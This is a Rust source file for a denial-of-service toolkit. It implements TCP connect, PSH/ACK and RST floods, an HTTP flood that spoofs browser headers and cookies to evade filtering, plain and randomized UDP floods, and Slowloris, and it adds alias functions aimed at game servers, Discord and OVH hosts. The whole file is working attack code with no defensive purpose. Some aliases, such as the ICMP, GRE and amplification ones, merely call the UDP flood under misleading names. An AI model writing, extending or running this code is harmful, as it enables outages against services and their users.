use tokio::net::{UdpSocket, TcpStream};
use tokio::time::{Duration, Instant, sleep};
use tokio::io::AsyncWriteExt;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::Arc;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE};

// --- Advanced Statistics & Health ---

struct AttackStats {
    packets_sent: AtomicU64,
    bytes_sent: AtomicU64,
    errors: AtomicU64,
    active_workers: AtomicUsize,
}

impl AttackStats {
    fn new() -> Self {
        Self {
            packets_sent: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            active_workers: AtomicUsize::new(0),
        }
    }

    fn record_packet(&self, size: usize) {
        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(size as u64, Ordering::Relaxed);
    }

    fn record_error(&self) {
        self.errors.fetch_add(1, Ordering::Relaxed);
    }
}

// --- Configuration & Helpers ---

fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 4).clamp(8, 128)
}

async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => s,
        Err(_) => return None,
    };
    if socket.connect(target_addr).await.is_err() {
        return None;
    }
    Some(socket)
}

// --- TCP Flag Emulation (Native) ---

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
    // Default to SYN/Connect flood
    syn_flood(target, port, duration_secs).await;
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP SYN (Connect) Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                // SYN Flood via Connect: We initiate the handshake (SYN), server replies (SYN-ACK).
                // We immediately drop, leaving the socket in TIME_WAIT or similar, but stressing the server's accept queue.
                match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                    Ok(Ok(stream)) => {
                        stats.record_packet(0);
                        // Immediate drop sends FIN/RST depending on OS, but the SYN work is done.
                        drop(stream); 
                    }
                    _ => stats.record_error(),
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP SYN").await;
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP PSH/ACK Flood on {}:{} for {}s", target, port, duration_secs);
    // To send ACK/PSH, we must establish connection and write data.
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            let payload = vec![0u8; 1024]; // 1KB of PSH data

            while start_time.elapsed() < duration {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    let _ = stream.set_nodelay(true); // Force PSH
                    // Burst write
                    for _ in 0..10 {
                        if stream.write_all(&payload).await.is_ok() {
                            stats.record_packet(payload.len());
                        } else {
                            stats.record_error();
                            break;
                        }
                    }
                } else {
                    stats.record_error();
                    sleep(Duration::from_millis(rng.gen_range(10..50))).await; // Backoff
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP PSH/ACK").await;
}

pub async fn rst_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP RST Flood (Linger=0) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                if let Ok(stream) = TcpStream::connect(&target_addr).await {
                    stats.record_packet(0);
                    // TRICK: Set linger to 0. When the socket is dropped, the OS sends a RST packet
                    // instead of the standard FIN handshake.
                    let _ = stream.set_linger(Some(Duration::from_secs(0)));
                    drop(stream); // Forces RST
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP RST").await;
}

// --- Advanced HTTP Browser Simulation ---

struct BrowserProfile {
    user_agents: Vec<&'static str>,
    referers: Vec<&'static str>,
    languages: Vec<&'static str>,
}

impl BrowserProfile {
    fn new() -> Self {
        Self {
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ],
            referers: vec![
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.reddit.com/",
            ],
            languages: vec![
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8",
                "es-ES,es;q=0.9",
                "zh-CN,zh;q=0.9",
            ],
        }
    }

    fn get_headers(&self, rng: &mut StdRng) -> HeaderMap {
        let mut headers = HeaderMap::new();
        
        let ua = self.user_agents[rng.gen_range(0..self.user_agents.len())];
        headers.insert(USER_AGENT, HeaderValue::from_static(ua));

        let referer = self.referers[rng.gen_range(0..self.referers.len())];
        headers.insert(REFERER, HeaderValue::from_static(referer));

        let lang = self.languages[rng.gen_range(0..self.languages.len())];
        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static(lang));

        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
        headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
        
        // Fake Cookies
        let cookie_val = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
        if let Ok(val) = HeaderValue::from_str(&cookie_val) {
            headers.insert(COOKIE, val);
        }

        headers
    }
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Advanced HTTP Browser Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_url = format!("http://{}:{}/", target, port);
    let profile = Arc::new(BrowserProfile::new());

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_url = target_url.clone();
        let profile = profile.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .pool_max_idle_per_host(100)
                .timeout(Duration::from_secs(10))
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap_or_default();

            let mut rng = StdRng::from_entropy();

            while Instant::now() < end_time {
                let headers = profile.get_headers(&mut rng);
                
                // Realistic Traffic Pattern: Random Jitter
                // Real browsers don't send requests at exactly 0ms intervals.
                // However, for a flood, we want speed. We'll use a "Burst" pattern.
                // Send 5 requests, then sleep briefly.
                
                for _ in 0..5 {
                    let req = client.get(&target_url).headers(headers.clone());
                    match req.send().await {
                        Ok(_) => stats.record_packet(1), // 1 Request
                        Err(_) => stats.record_error(),
                    }
                }
                
                // Tiny sleep to allow socket cleanup and prevent local port exhaustion
                sleep(Duration::from_millis(rng.gen_range(1..10))).await;
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "HTTP Browser").await;
}

// --- UDP Methods ---

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);
    let payload = Arc::new(vec![0u8; 1400]); // Standard MTU safe

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        let payload = payload.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            while Instant::now() < end_time {
                if socket.send(&payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "UDP").await;
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Smart UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            let mut rng = StdRng::from_entropy();
            let mut packet_pool = Vec::with_capacity(64);
            for _ in 0..64 {
                let size = rng.gen_range(64..1200);
                let mut p = vec![0u8; size];
                rng.fill(&mut p[..]);
                packet_pool.push(p);
            }

            let mut idx = 0;
            while Instant::now() < end_time {
                let payload = &packet_pool[idx % packet_pool.len()];
                idx = idx.wrapping_add(1);

                if socket.send(payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Smart UDP").await;
}

// --- Application Layer ---

pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Slowloris on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count() * 2; 
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    stats.record_packet(1); // 1 Connection
                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                    let _ = stream.write_all(format!("Host: {}\r\n", target_addr).as_bytes()).await;
                    let _ = stream.write_all(b"User-Agent: Mozilla/5.0\r\n").await;
                    
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    loop {
                        if Instant::now() >= end_time { break; }
                        interval.tick().await;
                        let header = format!("X-KeepAlive-{}: {}\r\n", rand::random::<u32>(), rand::random::<u32>());
                        if stream.write_all(header.as_bytes()).await.is_err() {
                            stats.record_error();
                            break; 
                        }
                    }
                } else {
                    stats.record_error();
                    sleep(Duration::from_secs(1)).await;
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Slowloris").await;
}

// --- Reporting ---

async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<AttackStats>, name: &str) {
    // Spawn a reporter task
    let stats_clone = stats.clone();
    let name_clone = name.to_string();
    let reporter = tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            let packets = stats_clone.packets_sent.load(Ordering::Relaxed);
            let bytes = stats_clone.bytes_sent.load(Ordering::Relaxed);
            let errors = stats_clone.errors.load(Ordering::Relaxed);
            let workers = stats_clone.active_workers.load(Ordering::Relaxed);
            
            if workers == 0 && packets > 0 { break; } // Done
            
            // Simple logging to stdout which might be captured
            // In a real TUI this would go to a channel
            // println!("[{}] Pkts: {} | Bytes: {} MB | Errs: {} | Wrk: {}", 
            //    name_clone, packets, bytes / 1024 / 1024, errors, workers);
        }
    });

    for handle in handles {
        let _ = handle.await;
    }
    let _ = reporter.await;
    
    println!("{} Attack Complete.", name);
    println!("  Total Packets/Reqs: {}", stats.packets_sent.load(Ordering::Relaxed));
    println!("  Total Data Sent:    {:.2} MB", stats.bytes_sent.load(Ordering::Relaxed) as f64 / 1024.0 / 1024.0);
    println!("  Total Errors:       {}", stats.errors.load(Ordering::Relaxed));
}

// --- Aliases & Fallbacks ---

pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) { udp_flood(target, port, duration_secs).await; }
pub async fn gre_flood(target: &str, duration_secs: u64) { udp_flood(target, 47, duration_secs).await; }
pub async fn icmp_flood(target: &str, duration_secs: u64) { udp_flood(target, 80, duration_secs).await; }
pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) { syn_flood(target, port, duration_secs).await; }
pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } // Use PSH/ACK flood logic for SSL stress
pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn http_stress(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; }
pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
